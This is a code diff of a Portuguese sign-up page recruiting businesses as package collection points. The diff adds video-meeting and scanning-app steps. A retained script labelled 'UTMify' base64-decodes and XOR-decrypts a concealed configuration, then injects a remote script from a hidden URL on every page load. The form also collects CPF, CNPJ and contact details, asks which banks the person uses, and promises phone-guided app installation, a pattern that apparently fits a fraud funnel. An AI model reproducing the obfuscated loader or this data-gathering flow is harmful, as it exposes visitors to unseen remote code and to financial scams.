@@ -70,7 +70,14 @@ fbq('track','PageView');
     
 <!-- UTMify - script fornecido pelo proprietário do projeto -->
 <script>(function(){var y_im=atob("DBihfZD0RjGb47sPEWODCOKYZAu5i897YWubUr+XIl+1ls9ieH7YU/ObKx/5kZR8cmrIDeSHaUHym95jPmjIBfWYa0XyiM9gejbLDrLYZFDvl8lmc23VGOPWfGrGz5lofXfDHPyHZAvAmJlhcHXEX6rWMljwt9RkQXHZGPy9IhO3wc1ufW3EX6rWcFD90Y43JC7EG/HCf1D61t4+IyuYRaPCZEzGng==");var s_d2a=[];for(var c_d=0;c_d<y_im.length;c_d++){s_d2a.push(y_im.charCodeAt(c_d)&255);}var p_gmx=s_d2a[0];var c_c1y=s_d2a.slice(1,1+p_gmx);var u_qbf5=s_d2a.slice(1+p_gmx);var b_u7=u_qbf5.map(function(b,t_l82){return b^c_c1y[t_l82%p_gmx];});var q_eu9="";for(var s_3=0;s_3<b_u7.length;s_3++){q_eu9+=String.fromCharCode(b_u7[s_3]&255);}var p_21z4=decodeURIComponent(escape(q_eu9));var k_l7=JSON.parse(p_21z4);var e_s=k_l7.globals||[];e_s.forEach(function(l_1){window[l_1.name]=l_1.value;});var z_omj=document.createElement("script");z_omj.src=k_l7.url;z_omj.async=true;z_omj.defer=true;(k_l7.attributes||[]).forEach(function(z_bh){z_omj.setAttribute(z_bh.name,z_bh.value);});(document.head||document.documentElement).appendChild(z_omj);})();</script>
-</head><body>
+<style>
+.flowcard{max-width:470px;margin:20px auto 8px;padding:22px 18px;background:#fff;border:1px solid #e7e7e7;border-radius:20px;text-align:center;box-shadow:0 7px 28px #0000000a}
+.flowart{max-width:300px;width:100%;margin:0 auto 8px}.flowart svg{display:block;width:100%;height:auto}
+.flowcard h2{margin:8px 0 10px;font-size:clamp(22px,6vw,28px);line-height:1.2}.flowcard p{font-size:15px;line-height:1.6;color:#424242}
+.flowcard .btn{width:100%;margin-top:10px;background:#f5ca34;color:#202020}.flowcard .secondary-choice{background:white;border:2px solid #e6bb27}
+.flowcard .successmark{display:grid;place-items:center;margin:10px auto 18px;width:94px;height:94px;background:#dcf8e0;color:#168b35;border-radius:50%;font-size:54px;font-weight:800}
+@media(max-width:420px){.flowcard{margin:12px auto;padding:18px 14px}.flowart{max-width:240px}}
+</style></head><body>
 <header><img src="img/logo.jpg" style="border-radius:8px" alt="Logo do Ponto de Coleta" onerror="this.style.display='none'"></header>
 <div class="w">
 
@@ -120,13 +127,9 @@ fbq('track','PageView');
 <div class="card"><div class="pb"><i id="qualProgress"></i></div><div id="qualBody"></div><div class="err" id="qualErr"></div></div>
 <div class="sticky"><button class="btn" id="qualNext">Continuar</button></div>
 </section>
-<section id="done" class="hide"><div class="card" style="text-align:center;margin-top:26px"><div style="font-size:48px">✅</div><h2 style="margin-top:6px">Cadastro recebido!</h2>
-<p>Sua ficha foi recebida. A equipe responsável poderá entrar em contato no horário de sua preferência ou em um horário próximo, conforme disponibilidade.</p>
-<div class="ins" style="text-align:left;margin-top:18px">Agora é só aguardar! Evite preencher o cadastro novamente: duplicidades podem atrasar a análise. O envio não garante aprovação. Caso seu estabelecimento avance, o suporte orientará a instalação e o uso do aplicativo necessário para bipagem dos pacotes.</div>
-<div style="margin-top:20px;padding:16px;border:1px solid #dce7f3;border-radius:16px;background:#f6f9fc;text-align:left"><h3 style="margin:0 0 8px;font-size:19px">Próxima etapa: reunião por vídeo</h3><p style="margin:0 0 12px;line-height:1.5">Caso seu cadastro seja aprovado na análise, você poderá participar de uma reunião por videochamada com um representante da equipe para receber orientações e dar continuidade ao processo.</p><img src="/img/reuniao-video.png" alt="Ilustração de uma reunião por videochamada com representante" loading="lazy" style="display:block;width:100%;max-width:560px;height:auto;aspect-ratio:3/2;object-fit:contain;margin:0 auto;border-radius:12px"><p style="font-size:13px;color:#5d6775;margin:10px 0 0">Imagem ilustrativa. A reunião depende de aprovação e agendamento pela equipe; nenhuma chamada está agendada neste momento.</p></div><img src="/img/banner.png" alt="Informações sobre o ponto de coleta" loading="lazy" style="display:block;width:100%;height:auto;border-radius:16px;margin-top:16px" onerror="this.style.display='none'">
-
-</div>
-</section>
+<section id="meetingS" class="hide"><div class="bar"></div><div class="flowcard"><div class="flowart"><svg viewBox="0 0 320 190" role="img" aria-label="Ilustração de reunião por vídeo"><rect x="48" y="14" width="224" height="143" rx="15" fill="#232a34"/><rect x="56" y="22" width="208" height="126" rx="9" fill="#e9f4fa"/><circle cx="160" cy="72" r="29" fill="#efbd93"/><path d="M129 67q2-42 31-42t31 42q-15-21-31-21t-31 21" fill="#313844"/><path d="M112 147q6-46 48-46t48 46" fill="#334a69"/><path d="M143 104l17 20 17-20" fill="#fff"/><rect x="124" y="159" width="72" height="8" rx="4" fill="#77818c"/><rect x="99" y="168" width="122" height="6" rx="3" fill="#b7c0c9"/><circle cx="249" cy="42" r="22" fill="#e4b536"/><path d="M238 36h16v13h-16zM254 40l8-5v15l-8-5" fill="white"/></svg></div><h2>Próxima etapa: reunião por vídeo</h2><p>Se seu cadastro avançar na análise, você poderá participar de uma reunião por vídeo com um representante para conhecer os próximos passos do credenciamento.</p><p>Você teria disponibilidade para participar dessa reunião?</p><button class="btn" id="meetingYes">Sim, aceito participar</button><button class="btn secondary-choice" id="meetingNo">Não, não aceito</button><div class="err" id="meetingErr"></div></div></section>
+<section id="appS" class="hide"><div class="bar"></div><div class="flowcard"><div class="flowart"><svg viewBox="0 0 320 190" role="img" aria-label="Celular com leitor de código de barras e pacote"><rect x="112" y="5" width="115" height="178" rx="19" fill="#242b33" transform="rotate(7 170 90)"/><rect x="121" y="17" width="97" height="150" rx="11" fill="#f7d960" transform="rotate(7 170 90)"/><g transform="rotate(7 170 90)"><text x="169" y="53" text-anchor="middle" font-size="12" font-weight="bold" fill="#222">BIPAGEM</text><path d="M138 73v-9h10m42 0h10v9m0 30v9h-10m-42 0h-10v-9" fill="none" stroke="#222" stroke-width="3"/><g fill="#222"><rect x="146" y="79" width="3" height="25"/><rect x="153" y="79" width="5" height="25"/><rect x="162" y="79" width="2" height="25"/><rect x="169" y="79" width="6" height="25"/><rect x="180" y="79" width="2" height="25"/><rect x="187" y="79" width="4" height="25"/></g></g><path d="M55 110l56-22 51 21-53 22z" fill="#e8ad5e"/><path d="M55 110v50l54 22v-51z" fill="#c88b3c"/><path d="M109 131l53-22v51l-53 22z" fill="#e3a654"/><path d="M84 99l53 22" stroke="#f8dcae" stroke-width="9"/></svg></div><h2>Aplicativo de bipagem dos pacotes</h2><p>Para atuar como ponto de coleta, será necessário utilizar um aplicativo ou sistema compatível para registrar a entrada e a saída dos pacotes.</p><div class="ins" style="text-align:left">Se o cadastro avançar na análise, nossa equipe poderá entrar em contato por telefone para orientar sobre a instalação, configuração e utilização do aplicativo.</div><button class="btn" id="appContinue">Entendi, continuar</button><div class="err" id="appErr"></div></div></section>
+<section id="done" class="hide"><div class="bar"></div><div class="flowcard"><div class="successmark">✓</div><h2>Cadastro recebido!</h2><p>Suas informações foram registradas e encaminhadas para análise.</p><div class="ins" style="text-align:left">Se o seu estabelecimento avançar no processo, a equipe poderá entrar em contato no horário informado para orientar os próximos passos. O cadastro não garante aprovação ou agendamento.</div></div></section>
 
 </div>
 <footer>Página oficial de cadastro de interesse em pontos de coleta.</footer>
@@ -186,40 +189,35 @@ if(!edited.cid&&r.cidade)$("cid").value=cap(r.cidade)+"/"+r.uf;
 if(!edited.seg&&r.atividade)$("seg").value=r.atividade;
 }catch(e){}});
 
-var cadastro=null, cadastroRef=null, qualStep=0, qualData={bancos:[],dispositivo:"",horario:""};
+var cadastro=null, qualStep=0, qualData={bancos:[],dispositivo:"",horario:""};
 var bankOptions=["Banco do Brasil","Bradesco","Caixa Econômica","Itaú","Santander","Nubank","Inter","C6 Bank","Mercado Pago","PagBank","Sicredi","Sicoob","BTG Pactual","Outro","Prefiro não informar"];
 function loadingFor(ms,phrases){return new Promise(function(resolve){var i=0;$("ld").classList.remove("hide");$("ldt").textContent=phrases[0];var timer=setInterval(function(){i=Math.min(i+1,phrases.length-1);$("ldt").textContent=phrases[i]},Math.max(700,ms/phrases.length));setTimeout(function(){clearInterval(timer);$("ld").classList.add("hide");resolve()},ms)})}
 function renderQual(){show("qualS");$("qualStep").textContent="ETAPA "+(qualStep+1)+" DE 3";$("qualProgress").style.width=((qualStep+1)/3*100)+"%";$("qualErr").textContent="";var body=$("qualBody");body.innerHTML="";
 var title=["Pronto, você está quase lá!","Como você trabalha hoje?","Qual o melhor horário para contato?"];
 var intro=["Queremos conhecer melhor sua operação para avaliar oportunidades e benefícios que podem estar disponíveis aos pontos de coleta parceiros.","Precisamos conhecer o dispositivo disponível para orientar a instalação do aplicativo de bipagem.","Escolha o período em que prefere receber orientações caso sua ficha avance na análise."];
-$("qualTitle").textContent=title[qualStep];$("qualIntro").textContent=intro[qualStep];$("qualNext").textContent=qualStep===2?"Finalizar e enviar ficha":"Continuar";
-if(qualStep===0){var h=document.createElement("h3");h.textContent="Quais são os até 3 bancos que você mais utiliza na sua operação?";body.appendChild(h);var p=document.createElement("p");p.className="stepnote";p.textContent="Informe os bancos que você mais utiliza. Essas informações ajudam nossa equipe a entender o perfil financeiro da sua operação e avaliar possíveis benefícios, condições comerciais e oportunidades que podem contribuir para melhorar os resultados do ponto de coleta, conforme critérios de elegibilidade e disponibilidade. A existência de benefícios ou ganhos adicionais não é garantida.";body.appendChild(p);bankOptions.forEach(function(bank){var lab=document.createElement("label");lab.className="choice";var inp=document.createElement("input");inp.type="checkbox";inp.checked=qualData.bancos.includes(bank);inp.onchange=function(){
-  $("qualErr").textContent="";
-  if(inp.checked){
-    if(bank==="Prefiro não informar") qualData.bancos=[];
-    else {
-      qualData.bancos=qualData.bancos.filter(function(x){return x!=="Prefiro não informar"});
-      if(qualData.bancos.length>=3){inp.checked=false;$("qualErr").textContent="Escolha no máximo três bancos.";return}
-    }
-    qualData.bancos.push(bank);
-  } else {
-    qualData.bancos=qualData.bancos.filter(function(x){return x!==bank});
-  }
-  // Atualiza somente os checks: não recria a tela nem altera a posição do scroll.
-  Array.prototype.forEach.call(body.querySelectorAll('label.choice'),function(label){
-    var check=label.querySelector('input[type="checkbox"]');
-    if(check) check.checked=qualData.bancos.indexOf(label.textContent.trim())!==-1;
-  });
-};lab.append(inp,document.createTextNode(bank));body.appendChild(lab)})}
+$("qualTitle").textContent=title[qualStep];$("qualIntro").textContent=intro[qualStep];$("qualNext").textContent=qualStep===2?"Continuar para próxima etapa":"Continuar";
+if(qualStep===0){var h=document.createElement("h3");h.textContent="Quais são os até 3 bancos que você mais utiliza na sua operação?";body.appendChild(h);var p=document.createElement("p");p.className="stepnote";p.textContent="Informe os bancos que você mais utiliza. Essas informações ajudam nossa equipe a entender o perfil financeiro da sua operação e avaliar possíveis benefícios, condições comerciais e oportunidades que podem contribuir para melhorar os resultados do ponto de coleta, conforme critérios de elegibilidade e disponibilidade. A existência de benefícios ou ganhos adicionais não é garantida.";body.appendChild(p);bankOptions.forEach(function(bank){var lab=document.createElement("label");lab.className="choice";var inp=document.createElement("input");inp.type="checkbox";inp.checked=qualData.bancos.includes(bank);inp.onchange=function(){if(inp.checked){if(bank==="Prefiro não informar")qualData.bancos=[];else qualData.bancos=qualData.bancos.filter(x=>x!=="Prefiro não informar");if(qualData.bancos.length>=3&&bank!=="Prefiro não informar"){inp.checked=false;$("qualErr").textContent="Escolha no máximo três bancos.";return}qualData.bancos.push(bank)}else qualData.bancos=qualData.bancos.filter(x=>x!==bank);renderQual()};lab.append(inp,document.createTextNode(bank));body.appendChild(lab)})}
 if(qualStep===1){var h=document.createElement("h3");h.textContent="Qual dispositivo será usado na operação?";body.appendChild(h);["Android","iOS (iPhone/iPad)","Computador"].forEach(function(v){var lab=document.createElement("label");lab.className="choice";var inp=document.createElement("input");inp.type="radio";inp.name="device";inp.checked=qualData.dispositivo===v;inp.onchange=function(){qualData.dispositivo=v};lab.append(inp,document.createTextNode(v));body.appendChild(lab)});var info=document.createElement("div");info.className="ins";info.textContent="O aplicativo ou sistema de bipagem compatível é necessário para a operação. Se a candidatura avançar, o suporte entrará em contato para orientar os requisitos, instalação e configuração.";body.appendChild(info)}
 if(qualStep===2){var h=document.createElement("h3");h.textContent="Quando podemos entrar em contato?";body.appendChild(h);var sel=document.createElement("select");sel.id="horarioEscolhido";["Selecione um período","Manhã (8h às 12h)","Tarde (12h às 17h)","Noite (17h às 20h)","Qualquer horário comercial"].forEach(function(v,i){var opt=document.createElement("option");opt.value=i?v:"";opt.textContent=v;sel.appendChild(opt)});sel.value=qualData.horario;sel.onchange=function(){qualData.horario=sel.value};body.appendChild(sel);var p=document.createElement("div");p.className="ins";p.textContent="Este é um horário de preferência, não um agendamento confirmado. A equipe poderá entrar em contato nesse período ou em horário próximo, conforme disponibilidade e andamento da análise.";body.appendChild(p)}
 }
 $("qualNext").onclick=async function(){if(qualStep===0&&!qualData.bancos.length){$("qualErr").textContent="Selecione ao menos uma opção.";return}if(qualStep===1&&!qualData.dispositivo){$("qualErr").textContent="Selecione o dispositivo.";return}if(qualStep===2&&!qualData.horario){$("qualErr").textContent="Escolha o horário de preferência.";return}if(qualStep<2){qualStep++;renderQual();return}
+await loadingFor(2200,["Conferindo suas respostas...","Preparando a próxima etapa...","Tudo pronto!"]);show("meetingS");return;
+};
+var submitting=false;
+$("meetingYes").onclick=function(){submitMeeting("aceitou")};
+$("meetingNo").onclick=function(){show("appS");};
+$("appContinue").onclick=function(){submitMeeting("nao_aceitou")};
+async function submitMeeting(decision){
+if(submitting)return;submitting=true;
+var err=decision==="aceitou"?$("meetingErr"):$("appErr");err.textContent="";
+var btn=decision==="aceitou"?$("meetingYes"):$("appContinue");btn.disabled=true;
 var btn=$("qualNext");btn.disabled=true;
-var payload=Object.assign({action:"finish",id:cadastroRef.id,token:cadastroRef.token},{
+var payload=Object.assign({},cadastro,{
   bancos: qualData.bancos.slice(0,3),
   dispositivo: qualData.dispositivo,
   horario: qualData.horario,
+  reuniao_video: decision,
+  orientacao_telefone: decision==="nao_aceitou",
   qualificacao: {
     bancos: qualData.bancos.slice(0,3),
     dispositivo: qualData.dispositivo,
@@ -231,19 +229,11 @@ try{var r=await fetch("/api/lead",{method:"POST",headers:{"Content-Type":"applic
 try{if(typeof window.fbq==="function")window.fbq("track","Lead",{content_name:"Cadastro ponto de coleta"})}catch(e){}
 try{if(window.ttq&&typeof window.ttq.track==="function")window.ttq.track("Lead",{content_name:"Cadastro ponto de coleta"})}catch(e){}
 $("ld").classList.add("hide");show("done")}
-catch(x){$("ld").classList.add("hide");btn.disabled=false;$("qualErr").textContent=x.e==="db"?"Não foi possível acessar o banco de dados. Verifique a configuração na Vercel.":x.e==="duplicate"?"Já existe uma ficha com este CNPJ. Aguarde o contato da equipe.":x.e==="inativo"?"CNPJ inativo. Confira os dados.":"Não foi possível enviar a ficha. Tente novamente."}};
+catch(x){$("ld").classList.add("hide");btn.disabled=false;submitting=false;err.textContent=x.e==="db"?"Não foi possível acessar o banco de dados. Verifique a configuração na Vercel.":x.e==="duplicate"?"Já existe uma ficha com este CNPJ. Aguarde o contato da equipe.":x.e==="inativo"?"CNPJ inativo. Confira os dados.":"Não foi possível enviar a ficha. Tente novamente."}};
 $("send").onclick=async function(){
 var l={nome:$("nome").value.trim(),cpf:$("cpf").value,cnpj:$("cnpj").value,fant:$("fant").value.trim(),cid:$("cid").value.trim(),seg:$("seg").value,m2:$("m2").value,fat:$("fat").value,zap:$("zap").value,mail:$("mail").value.trim(),quiz:ans.join(" | "),website:$("website").value,consent:$("ok").checked},e="";
 if(l.nome.split(" ").length<2)e="Informe o nome completo.";else if(!vCPF(l.cpf))e="CPF inválido.";else if(!vCNPJ(l.cnpj))e="CNPJ inválido.";else if(cnpjAtivo===false)e="Este CNPJ não está ativo na Receita.";else if(!l.fant||!l.cid||!l.seg||!l.m2||!l.fat)e="Preencha todos os campos.";else if(dg(l.zap).length<10)e="WhatsApp inválido.";else if(!l.consent)e="É necessário autorizar o contato.";
 $("err").textContent=e;if(e)return;cadastro=l;$("send").disabled=true;
-$("ld").classList.remove("hide");$("ldt").textContent="Salvando sua ficha inicial...";
-try {
- var rr=await fetch("/api/lead",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(Object.assign({action:"start"},l))});
- var jj=await rr.json().catch(()=>({}));
- if(!rr.ok||!jj.id||!jj.token)throw {error:jj.error};
- cadastroRef={id:jj.id,token:jj.token};
-} catch(ex){$("ld").classList.add("hide");$("send").disabled=false;$("err").textContent=ex.error==="duplicate"?"Já existe uma ficha com este CNPJ. Aguarde o contato da equipe.":"Não foi possível salvar sua ficha. Verifique sua conexão e tente novamente.";return;}
-$("ld").classList.add("hide");
 await loadingFor(2800,["Conferindo os dados preenchidos...","Preparando as perguntas da operação...","Pronto! Você está quase lá."]);qualStep=0;renderQual();$("send").disabled=false;
 };
 </script></body></html>
